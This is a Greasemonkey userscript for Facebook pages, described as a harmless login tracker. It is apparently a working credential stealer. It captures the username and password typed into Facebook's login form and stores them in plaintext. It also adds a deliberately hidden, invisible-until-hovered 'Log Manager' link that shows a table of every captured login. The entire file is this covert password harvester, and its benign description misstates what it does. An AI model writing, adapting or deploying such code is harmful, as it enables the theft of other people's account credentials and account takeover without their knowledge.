// ==UserScript==
// @name       Facebook Account Logger
// @namespace  FBLog
// @version    0.1
// @description  Logs facebook login information if its not already logged. Good for keeping track of active logins on your computer.
// @include        https://www.facebook.com/*
// @include        http://www.facebook.com/*
// ==/UserScript==

var debug = false;

function debugEcho(msg) {
	if (debug) {
		console.log('[Userscript: FacebookLogger] ' + msg);
	}
}

if(document.getElementById("logout_form") == null) { // not logged in 
	// get password area
	var facebook = document.getElementById("pass");
	if(facebook == null) return;
	debugEcho("Password element exists, code injected!");
	
	// add stealth log manager link
	var newLink = document.createElement("div");
	newLink.appendChild(document.createTextNode("Log Manager"));
	newLink.title = "- Log Manager - ";
	
	newLink.id = "log_manager";
	newLink.style.opacity = 0;
	newLink.onmouseover = function () {
		this.style.opacity = 1;
		debugEcho("Hovering over link | Opacity set to 1 (visible)");
	}
	newLink.onmouseout = function () {
		this.style.opacity = 0;
		debugEcho("Not hovering over link | Opacity set to 0 (hidden)");
	}
	
	newLink.onclick = function() {
		openLogManager();
	}
	
	document.body.appendChild(newLink);
	
	debugEcho("Log Manager link created!");
	
	
	
	facebook.onchange = function() {
		var details = {
			user_name: document.getElementById("email").value,
				 pass: this.value,
			getDetails: function() { return 'user_name='+ this.user_name + ' pass=' + this.pass }
		};
		debugEcho('Set details: '+details.getDetails());
		
		if(details.user_name.length > 0 && this.value.length > 0){
			var storage_id = "facebooklog_"+details.user_name + "_" + window.btoa(details.pass);
			details.sID = storage_id;
			debugEcho('Storage ID: '+storage_id);
			
			if(GM_getValue(storage_id,-1) != -1){
				debugEcho(storage_id + ' already in storage!');
			}else{
				debugEcho('Adding details: storage_id=' + storage_id + ' Details: ' + details.getDetails());
				GM_setValue(storage_id, details);    
			}
		}
	}
}

function openLogManager() {
    debugEcho("Log Manager Opened!");
	var LogManager = window.open('','','width=400,height=400');
	LogManager.document.write('<table><tr><td>Log Manager</td></tr></table>');
	
	debugEcho("Creating table...");
	var logTable = LogManager.document.createElement('table');
	logTable.border = 1;

	var row = logTable.insertRow(0);
	row.insertCell(0).innerHTML = "<b>Username</b>";
	row.insertCell(1).innerHTML = "<b>Password</b>";
	
	GM_listValues().forEach(function(val){
		var log = GM_getValue(val);
		var row = logTable.insertRow(logTable.rows.length);
		row.insertCell(0).innerHTML = log.user_name;
		row.insertCell(1).innerHTML = log.pass;
	});
	
	LogManager.document.body.appendChild(logTable);	
	LogManager.focus();
}